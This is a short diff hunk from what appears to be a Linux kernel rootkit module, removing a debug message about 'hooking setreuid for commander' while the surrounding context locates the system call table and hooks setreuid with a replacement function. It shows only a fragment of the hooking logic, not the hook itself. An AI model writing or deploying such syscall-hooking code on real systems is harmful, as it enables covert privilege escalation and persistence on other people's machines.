@@ -90,8 +90,6 @@ static int __init r0mod_init(void)
 
     DEBUG("Search Found: sct @ %lx\n", (unsigned long)sct);
 
-    DEBUG("Hooking setreuid for commander!\n");
-
     orig_setreuid = (void *)sct[__NR_setreuid];
     hook_start(orig_setreuid, &new_setreuid);
 
